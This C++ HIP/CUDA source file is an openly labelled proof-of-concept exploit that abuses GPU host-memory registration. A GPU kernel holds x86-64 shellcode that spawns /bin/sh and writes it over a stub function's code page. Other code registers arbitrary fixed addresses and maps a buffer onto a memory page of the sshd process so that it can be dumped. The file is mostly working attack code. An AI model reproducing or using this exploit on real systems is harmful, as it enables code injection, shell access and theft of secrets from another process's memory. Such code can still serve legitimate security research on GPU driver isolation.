#include "hip/hip_runtime.h"
/**
 * Copyright 1993-2012 NVIDIA Corporation.  All rights reserved.
 *
 * Please refer to the NVIDIA end user license agreement (EULA) associated
 * with this source code for terms and conditions that govern your use of
 * this software. Any use, reproduction, disclosure, or distribution of
 * this software and related documentation outside the terms of the EULA
 * is strictly prohibited.
 */
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <hip/hip_runtime.h>
#include <fstream>
#include <string>
#include <iostream>
#include <sstream>



#define ALIGN 0x1000
using namespace std;

// Some dirtry tricks, should be replaced by mmap()
void *aligned_malloc(int size) {
    void *mem = malloc(size+ALIGN+sizeof(void*));
    void **ptr = (void**)((long)(mem+ALIGN+sizeof(void*)) & ~(ALIGN-1));
    ptr[-1] = mem;
    return ptr;
}

void aligned_free(void *ptr) {
    free(((void**)ptr)[-1]);
}




//#define hipHostRegisterPortable   0x01

//static const int WORK_SIZE = 256;

/**
 * This macro checks return value of the CUDA runtime call and exits
 * the application if the call failed.
 */
//int global;

#define CUDA_CHECK_RETURN(value) {											\
	hipError_t _m_cudaStat = value;										\
	if (_m_cudaStat != hipSuccess) {										\
		fprintf(stderr, "Error %s at line %d in file %s\n",					\
				hipGetErrorString(_m_cudaStat), __LINE__, __FILE__);		\
		exit(1);															\
	} }

#define CUDA_CHECK_NORETURN(value) {											\
	hipError_t _m_cudaStat = value;										\
	if (_m_cudaStat != hipSuccess) {										\
		fprintf(stderr, "Error %s at line %d in file %s\nContinue\n",					\
				hipGetErrorString(_m_cudaStat), __LINE__, __FILE__);		\
	} }


/* CUDA kernel to copy the shellcode. Basically copies to source with given offset. */
__global__ void PixsysCuda(char * d_source, int offset)
{
	//if (threadIdx.x == 0) printf("Inside PixsysCuda\n");
	char shellcode[] = {
			"\x48\x31\xff\x57\x57\x5e\x5a\x48\xbf\x2f\x2f"
			"\x62\x69\x6e\x2f\x73\x68\x48\xc1\xef\x08\x57"
			"\x54\x5f\x6a\x3b\x58\x0f\x05\x90\x90\x90"
	};
		(d_source+offset)[threadIdx.x]=shellcode[threadIdx.x];

}

/* CUDA kernel to print out the dumped memory page. */
__global__ void PixsysCuda_print(char * d_source, int size)
{
  int i;
	printf("dumped memory page:\n");
  for (i = 0; i < size; i ++) printf("%02x", d_source[i]);
	printf("\n");
}

__global__ void print_kernel()
{
  int i;
	printf("dumped memory page:\n");
	printf("\n");
}

void Stub_Funct ()
{
	printf("NOTHING Here!\n");
	__asm__(
			"nop;"
			"nop;"
			"nop;"
			"nop;"
			"nop;"
			"nop;"
			"nop;"
			"nop;"
			"nop;"
			"nop;"
			"nop;"
			"nop;"
			"nop;"
			"nop;"
			"nop;"
			"nop;"
			"nop;"
			"nop;"
			"nop;"
			"nop;"
			"nop;"
			"nop;"
			"nop;"
			"nop;"
			"nop;"
			"nop;"
			"nop;"
			"nop;"
			"nop;"
			"nop;"
	);
}

/**
 * Host function that prepares data array and passes it to the CUDA kernel.
 */
typedef struct hidden_driver_info
{
//	long int start_addr;
//	long int end_addr;
	int pid;
	long int sshd_page_addr;
} hidden_driver_info ,*p_hidden_info;

typedef void (*s_funct) () ;
int main(void) {

#if 0
	print_kernel<<<1,1>>>();
	CUDA_CHECK_RETURN(hipDeviceSynchronize());
	CUDA_CHECK_RETURN(hipDeviceSynchronize());	// Wait for the GPU launched work to complete

	CUDA_CHECK_NORETURN(hipPeekAtLastError());

	fflush(stdout);


#endif

	int pagesize = 0x1000;
	s_funct f;
	pagesize = getpagesize(); // get Page size of system (usually 0x1000)
	//printf("page size is: %d\n",pagesize);

	p_hidden_info info_for_cuda_driver = (p_hidden_info)aligned_malloc(sizeof(hidden_driver_info)); // malloc info hiden buffer

	printf("info buffer addr: 0x%llx\n",(unsigned long)info_for_cuda_driver);

  // Malloc alligned buffer.
#ifdef _ATTACK_1
	char * real_buff = (char*)aligned_malloc(pagesize*sizeof(char));
#endif
	char * dump_buff = (char*)aligned_malloc(pagesize*sizeof(char));

#ifdef _ATTACK_1
	memset(real_buff,0x4141,pagesize*sizeof(char)); // Fill buffer with 414141
#endif
	memset(dump_buff,1,pagesize*sizeof(char));

	/*calculate the victim function parameters*/
	f=&Stub_Funct;
	int offset = (unsigned long)f % 0x1000;
	int base = ((unsigned long)f / 0x1000)* 0x1000;
	f();
	printf("Stub Function Address: 0x%lx\n",(unsigned long)f);
	printf("Stub Function offset: 0x%lx\n",(unsigned long)offset);
	printf("Stub Function base: 0x%lx\n",(unsigned long)base);
	fflush(stdout);

	//printf("Buffer: 0x%08x\n",*(unsigned int *)real_buff);

	//Set hidden Address:
//	info_for_cuda_driver->start_addr = (unsigned long)base;
	info_for_cuda_driver->pid = 1424;
	//info_for_cuda_driver->sshd_page_addr = 0x7f1862dac000;

	char * d_real_buff;
	char * d_dump_buff;

	printf("GOING IN!\n");
	fflush(stdout);

	/* Try to set up the mallicious bit */
	try
	{
		hipHostRegister((void *)0x0400000, sizeof(hidden_driver_info), hipHostRegisterPortable) ;
		hipHostRegister((void *)0x0800000, sizeof(hidden_driver_info), hipHostRegisterPortable) ;
		hipHostRegister((void *)0x01200000, sizeof(hidden_driver_info), hipHostRegisterPortable) ;
	}
	catch (...)
	{
		printf("NAH");
	}
	/* register the info buffer. First things first... */
	CUDA_CHECK_RETURN(hipHostRegister((void *)info_for_cuda_driver, sizeof(hidden_driver_info), hipHostRegisterPortable)) ;
	/* Map what a Nice guy would think is a benevelent buffer.
	Note : Data is copied from user space hidden buffer. It can be changed afterwards. Will not effect Driver!*/

CUDA_CHECK_NORETURN(hipPeekAtLastError());

#ifdef _ATTACK_1
	CUDA_CHECK_RETURN(hipHostRegister((void *)real_buff, pagesize*sizeof(char), hipHostRegisterPortable)) ;

	/* Get device pointer of this buffer */
	CUDA_CHECK_RETURN(hipHostGetDevicePointer((void**)&d_real_buff,real_buff,0));
	//printf("Device PTR is : 0x%08x\n",(unsigned int *)d_real_buff);
	fflush(stdout);

	/* info buffer in UM can be changed now. No effect. */
	//info_for_cuda_driver->start_addr = (unsigned long)stdout->_IO_write_base;
	//printf("write_base addr: 0x%lx\n",(unsigned long)stdout->_IO_write_base);
	//(stdout->_IO_write_base)[1]='W';

	/*Activate cuda kernel, that copies shellcode */
	PixsysCuda<<<1,64>>>(d_real_buff,offset);

//	fflush(stdout);

	CUDA_CHECK_RETURN(hipDeviceSynchronize());	// Wait for the GPU launched work to complete
#endif

#define _ATTACK_2
#ifdef _ATTACK_2

//	for (int i = 0; i < 10; i ++) {
	{
	/* Map this buffer to a memory page which currently maped by sshd. */
	CUDA_CHECK_RETURN(hipHostRegister((void *)dump_buff, pagesize*sizeof(char), hipHostRegisterPortable)) ;

	/* Get device pointer of this buffer */
	CUDA_CHECK_RETURN(hipHostGetDevicePointer((void**)&d_dump_buff, dump_buff,0));

	fflush(stdout);
  // test print cpu side dump_buff, shoud be 4141
//	printf("dump_buff:\n");
//	memset(dump_buff,1,pagesize*sizeof(char));
//	for (int i = 0; i < 1024; i ++) printf("%d %c ", i, dump_buff[i]);

	/*Activate cuda kernel, that print the dumped page */
#if 0
	PixsysCuda_print<<<1,1>>>(d_dump_buff, pagesize);
	CUDA_CHECK_RETURN(hipDeviceSynchronize());
	CUDA_CHECK_RETURN(hipDeviceSynchronize());	// Wait for the GPU launched work to complete
#endif
	}

	CUDA_CHECK_NORETURN(hipPeekAtLastError());

	fflush(stdout);

#endif


	// should remove this?
#ifdef _ATTACK_1
		CUDA_CHECK_RETURN(hipHostUnregister((void *)real_buff));
#endif
		CUDA_CHECK_RETURN(hipHostUnregister((void *)dump_buff));
		CUDA_CHECK_RETURN(hipDeviceSynchronize());	// Wait for the GPU launched work to complete
		CUDA_CHECK_NORETURN(hipGetLastError());

		printf("Finished, now exiting.\n");

	//}
	//sleep(3000);
	/*for (i = 0; i < WORK_SIZE; i++)
		idata[i] = (unsigned int) i;

	CUDA_CHECK_RETURN(hipMalloc((void**) &d, sizeof(int) * WORK_SIZE));
	CUDA_CHECK_RETURN(
			hipMemcpy(d, idata, sizeof(int) * WORK_SIZE, hipMemcpyHostToDevice));

	bitreverse<<<1, WORK_SIZE, WORK_SIZE * sizeof(int)>>>(d);
	*/
	//CUDA_CHECK_RETURN(hipDeviceSynchronize());	// Wait for the GPU launched work to complete
	//CUDA_CHECK_NORETURN(hipGetLastError());
	/*CUDA_CHECK_RETURN(hipMemcpy(odata, d, sizeof(int) * WORK_SIZE, hipMemcpyDeviceToHost));

	for (i = 0; i < WORK_SIZE; i++)
		printf("Input value: %u, device output: %u\n", idata[i], odata[i]);

	CUDA_CHECK_RETURN(hipFree((void*) d));
	CUDA_CHECK_RETURN(hipDeviceReset());
*/
	return 0;
}
